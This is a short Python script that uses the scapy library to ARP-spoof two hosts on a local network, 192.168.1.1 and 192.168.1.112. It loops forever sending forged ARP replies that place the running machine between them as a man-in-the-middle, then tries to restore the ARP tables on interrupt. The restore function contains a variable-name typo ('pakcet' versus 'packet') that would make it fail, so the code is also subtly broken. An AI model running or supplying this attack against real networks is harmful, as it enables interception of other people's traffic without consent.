#!/usr/bin/python

import scapy.all as scapy

# restore helps restore the original mac address.
def restore(dst_ip, source_ip):
    dst_mac = get_target_mac(dst_ip)
    src_mac = get_target_mac(source_ip)
    pakcet = scapy.ARP(op=2, hwdst= dst_mac, pdst= dst_ip, hwsrc= src_mac, psrc=source_ip)
    scapy.send(packet, verbose=False)

#get_target_mac uses scapy library to get the target mac address.
def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast/arp_request
    answer= scapy.srp(finalpacket, timeout=2, verbose =False)[0]
    mac = answer[0][1].hwsrc
    return(mac)

#spoof_arp sends an ARP packet to a target with a spoofed ip address.
def spoof_arp(target_ip, spoofed_ip):
    mac = get_target_mac(target_ip)
    packet=scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)

def main():
    try:
        while True:
            spoof_arp("192.168.1.1", "192.168.1.112")
            spoof_arp("192.168.1.112", "192.168.1.1")

    except KeyboardInterrupt:
        restore("192.168.1.1", "192.168.1.112")
        restore("192.168.1.112", "192.168.1.1")
        exit(0)

main()